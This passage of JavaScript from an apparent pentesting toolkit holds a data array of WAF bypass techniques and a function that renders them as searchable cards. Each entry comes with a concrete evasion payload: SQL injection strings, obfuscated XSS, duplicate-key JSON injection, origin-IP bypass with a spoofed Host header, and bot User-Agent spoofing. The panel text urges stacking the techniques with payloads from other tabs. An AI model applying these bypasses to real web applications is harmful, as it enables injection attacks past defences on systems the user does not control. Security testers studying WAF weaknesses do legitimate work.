  { cat: "Protocol / transport", title: "Path normalization confusion", desc: "WAF and backend may normalize URL paths differently (trailing slashes, ./ segments, case) causing a rule matched against one normalized form to miss the raw request the backend actually processes.", example: "/admin/../admin/./config" },
  { cat: "Fragmentation / obfuscation", title: "Payload splitting across parameters", desc: "Break a blocked keyword across two parameters that the application later concatenates, so no single parameter contains the full signature.", example: "p1=UNI&p2=ON SELECT" },
  { cat: "Fragmentation / obfuscation", title: "String concatenation at runtime", desc: "Build the sensitive string using the target language's own concatenation operators so the literal string never appears together in the request.", example: "'ale'+'rt(1)'" },
  { cat: "Fragmentation / obfuscation", title: "JSON key/array reordering", desc: "Some WAF JSON inspectors assume a canonical field order; reordering or duplicating keys can cause the inspected value to differ from the value the backend actually uses.", example: "{\"a\":\"safe\",\"a\":\"' OR 1=1--\"}" },
  { cat: "Fragmentation / obfuscation", title: "Recursive nested encoding", desc: "Layer multiple different encodings (URL then base64 then URL again) — WAFs typically only unwrap one or two layers before giving up.", example: "%2532322532353663253235373236..." },
  { cat: "Fragmentation / obfuscation", title: "Zero-width / invisible Unicode characters", desc: "Zero-width space (U+200B) or joiner characters inserted mid-keyword can defeat literal string matching while many interpreters strip or ignore them.", example: "java\\u200bscript:alert(1)" },
  { cat: "Fragmentation / obfuscation", title: "Homoglyph substitution", desc: "Visually identical Unicode characters from other scripts (Cyrillic а vs Latin a) can defeat exact-string blocklists while rendering identically to a human reviewer.", example: "\\u0430lert(1) (Cyrillic а)" },
  { cat: "Logic / semantic", title: "Equivalent boolean logic", desc: "If 'OR 1=1' is blocklisted, semantically identical alternatives (OR 'a'='a', OR true, OR 2>1) often are not.", example: "' OR 'a'='a" },
  { cat: "Logic / semantic", title: "Arithmetic obfuscation of numbers", desc: "Replace a suspicious constant with an equivalent arithmetic expression to defeat blocklists on specific numeric values.", example: "SLEEP(2+3)" },
  { cat: "Logic / semantic", title: "Alternate function names (SQL)", desc: "Most SQL engines expose several functions with overlapping capability (SLEEP vs BENCHMARK, SUBSTRING vs MID vs SUBSTR) — rotate through them if one is blocked.", example: "BENCHMARK(5000000,MD5('a'))" },
  { cat: "Logic / semantic", title: "Second-order injection", desc: "Store a payload somewhere benign (profile field) that passes WAF inspection at write-time, then let the application use it unsafely later in a different, unprotected code path (e.g. an internal admin report).", example: "Store username as admin'-- in signup, exploited later in an internal query" },
  { cat: "Logic / semantic", title: "Time-based blind confirmation", desc: "When output-based bypasses are all blocked, fall back to time-based blind techniques that don't require any payload output to be reflected — much harder for a WAF to signature-match reliably.", example: "'; IF (1=1) WAITFOR DELAY '0:0:5'--" },
  { cat: "Infrastructure", title: "Direct-to-origin IP bypass", desc: "If the WAF is a reverse proxy (e.g. Cloudflare) in front of the real origin server, finding and connecting directly to the origin IP (via DNS history, SSL cert transparency logs, subdomain misconfig) bypasses the WAF entirely.", example: "curl -H 'Host: victim.com' https://ORIGIN_IP/" },
  { cat: "Infrastructure", title: "Rate-limit / rule threshold evasion", desc: "Some WAF rules trigger only above a request-rate threshold; slowing down requests or distributing them across many source IPs can keep each individual request under the detection threshold.", example: "1 request per 30s from a rotating IP pool" },
  { cat: "Infrastructure", title: "User-Agent / header allowlist abuse", desc: "Some WAF configurations allowlist requests from known good bots (search engine crawlers, monitoring services) based solely on the User-Agent header, which is trivially spoofable.", example: "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)" },
  { cat: "Infrastructure", title: "TLS/JA3 fingerprint rotation", desc: "Advanced WAFs fingerprint the TLS ClientHello (JA3) to detect known scanning tools; using a different TLS library/cipher-suite order can evade fingerprint-based blocking.", example: "curl --ciphers, or a JA3-randomizing HTTP client" },
];

const WAF_CATS = Array.from(new Set(WAF_TECHNIQUES.map((t) => t.cat)));

function renderWafPanel(container) {
  let catFilter = "all";
  let search = "";

  function filtered() {
    const q = search.trim().toLowerCase();
    return WAF_TECHNIQUES.filter((t) => {
      if (catFilter !== "all" && t.cat !== catFilter) return false;
      if (q && !t.title.toLowerCase().includes(q) && !t.desc.toLowerCase().includes(q) && !t.example.toLowerCase().includes(q)) return false;
      return true;
    });
  }

  function paint() {
    const items = filtered();
    container.innerHTML = `
      <div class="panel pg-panel-inner">
        <h2 class="pg-h2" style="margin-top:0">WAF Bypass Techniques <span class="pg-count-badge">${WAF_TECHNIQUES.length} techniques</span></h2>
        <p class="muted">General-purpose evasion techniques for signature/regex-based Web Application Firewalls, organized by category. Combine several of these with the payloads in the other tabs — most real-world bypasses stack two or three techniques together.</p>
        <div class="tk-row pg-opts-row">
          <input class="tk-f" id="waf-search" placeholder="search techniques..." value="${esc(search)}" style="flex:2;min-width:180px">
          <select class="tk-f" id="waf-cat" style="min-width:190px">
            <option value="all"${catFilter === "all" ? " selected" : ""}>All categories</option>
            ${WAF_CATS.map((c) => `<option value="${esc(c)}"${catFilter === c ? " selected" : ""}>${esc(c)}</option>`).join("")}
          </select>
        </div>
        <div class="pg-stats-row">
          <div class="stat"><div class="stat-n">${items.length}</div><div class="stat-l">shown</div></div>
          <div class="stat"><div class="stat-n">${WAF_TECHNIQUES.length}</div><div class="stat-l">total techniques</div></div>
          <div class="stat"><div class="stat-n">${WAF_CATS.length}</div><div class="stat-l">categories</div></div>
        </div>
        <div class="pg-waf-grid">${items.map((t) => `
          <div class="pg-waf-card">
            <span class="pg-waf-tag">${esc(t.cat)}</span>
            <h4>${esc(t.title)}</h4>
            <p class="muted" style="font-size:.78rem;line-height:1.5;margin:0">${esc(t.desc)}</p>
            <code>${esc(t.example)}</code>
          </div>`).join("") || `<div class="pg-empty">No techniques match the current filters.</div>`}
        </div>
      </div>`;

    container.querySelector("#waf-search").oninput = (e) => { search = e.target.value; paint(); };
    container.querySelector("#waf-cat").onchange = (e) => { catFilter = e.target.value; paint(); };
  }

  paint();
}
